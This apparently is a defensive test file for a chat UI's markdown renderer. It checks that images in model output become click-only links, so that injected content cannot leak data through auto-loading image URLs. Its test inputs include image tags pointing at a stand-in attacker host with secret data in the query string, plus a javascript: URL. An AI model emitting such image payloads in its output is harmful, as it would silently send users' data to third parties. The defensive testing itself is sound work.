// @vitest-environment jsdom

/**
 * Images in rendered markdown never load on render: model output can be
 * steered by untrusted content, and a remote image would send its URL (and any
 * data encoded in it) to a third party without a click. Images render as
 * links that open the URL only when clicked.
 */
import React, { act } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { createRoot } from 'react-dom/client';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

vi.mock('@beaver/agent-ui/chat/Citation', () => ({
    default: () => null,
}));

import { setHost } from '@beaver/agent-ui/host';
import MarkdownRenderer from '../../../react/components/messages/MarkdownRenderer';

const navigation = {
    revealObject: vi.fn(),
    revealCollection: vi.fn(),
    openExternalUrl: vi.fn(),
};

const EXFIL_URL = 'https://attacker.example/p.png?d=secret';

function staticHtml(content: string, exportRendering = false): string {
    return renderToStaticMarkup(React.createElement(MarkdownRenderer, { content, exportRendering }));
}

describe('MarkdownRenderer images', () => {
    let root: ReturnType<typeof createRoot> | null = null;
    let container: HTMLDivElement | null = null;

    beforeEach(() => {
        vi.clearAllMocks();
        (globalThis as any).IS_REACT_ACT_ENVIRONMENT = true;
        setHost({ navigation: navigation as any });
    });

    afterEach(() => {
        if (root) act(() => root?.unmount());
        container?.remove();
        root = null;
        container = null;
        setHost({});
        delete (globalThis as any).IS_REACT_ACT_ENVIRONMENT;
    });

    function mount(content: string): HTMLDivElement {
        container = document.createElement('div');
        document.body.appendChild(container);
        root = createRoot(container);
        act(() => {
            root?.render(React.createElement(MarkdownRenderer, { content }));
        });
        return container;
    }

    it('renders a markdown image as a link instead of an <img>', () => {
        const html = staticHtml(`Done.\n\n![chart](${EXFIL_URL})`);
        expect(html).not.toContain('<img');
        expect(html).toContain('>chart</a>');
    });

    it('does not render raw HTML images', () => {
        const html = staticHtml(`Done. <img src="${EXFIL_URL}" alt="x">`);
        expect(html).not.toContain('<img');
    });

    it('drops <picture>/<source> so a remote srcset cannot load', () => {
        const html = staticHtml(
            `<picture><source srcset="${EXFIL_URL}"><img alt="x"></picture>`,
        );
        expect(html).not.toContain('<img');
        expect(html).not.toContain('<source');
        expect(html).not.toContain('attacker.example');
    });

    it('labels an image without alt text with its URL', () => {
        const html = staticHtml(`![](${EXFIL_URL})`);
        expect(html).not.toContain('<img');
        expect(html).toContain('attacker.example/p.png');
    });

    it('opens the image URL through the host only when clicked', () => {
        const el = mount(`![chart](${EXFIL_URL})`);
        expect(el.querySelector('img')).toBeNull();
        expect(navigation.openExternalUrl).not.toHaveBeenCalled();

        const anchor = el.querySelector('a') as HTMLAnchorElement;
        act(() => {
            anchor.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }));
        });
        expect(navigation.openExternalUrl).toHaveBeenCalledWith(EXFIL_URL);
    });

    it('renders images as plain links in export renders', () => {
        const html = staticHtml(`![chart](${EXFIL_URL})`, true);
        expect(html).not.toContain('<img');
        expect(html).toContain(`href="${EXFIL_URL.replace('&', '&amp;')}"`);
        expect(html).toContain('>chart</a>');
    });

    describe('inside a link', () => {
        const ARTICLE_URL = 'https://example.org/article';
        const LINKED_IMAGE = `[![chart](${EXFIL_URL})](${ARTICLE_URL})`;

        it('becomes the label of the outer link, without nesting anchors', () => {
            const html = staticHtml(LINKED_IMAGE);
            expect(html).not.toContain('<img');
            expect(html.match(/<a\b/g)).toHaveLength(1);
            expect(html).toContain(`href="${ARTICLE_URL}"`);
            expect(html).toContain('>chart</a>');
            expect(html).not.toContain('attacker.example');
        });

        it('opens only the outer link when clicked', () => {
            const el = mount(LINKED_IMAGE);
            const anchors = el.querySelectorAll('a');
            expect(anchors).toHaveLength(1);
            act(() => {
                anchors[0].dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }));
            });
            expect(navigation.openExternalUrl).toHaveBeenCalledTimes(1);
            expect(navigation.openExternalUrl).toHaveBeenCalledWith(ARTICLE_URL);
        });

        it('stays a single anchor when nested in raw HTML', () => {
            const html = staticHtml(`<a href="${ARTICLE_URL}"><span><img src="${EXFIL_URL}" alt="chart"></span></a>`);
            expect(html).not.toContain('<img');
            expect(html.match(/<a\b/g)).toHaveLength(1);
            expect(html).not.toContain('attacker.example');
        });

        it('stays a single anchor in export renders', () => {
            const html = staticHtml(LINKED_IMAGE, true);
            expect(html).not.toContain('<img');
            expect(html.match(/<a\b/g)).toHaveLength(1);
            expect(html).toContain(`href="${ARTICLE_URL}"`);
        });
    });

    it('shows only the alt text for an image whose URL is unsafe', () => {
        const html = staticHtml('![chart](javascript:alert(1))');
        expect(html).not.toContain('<img');
        expect(html).not.toContain('javascript:');
        expect(html).toContain('chart');
    });
});
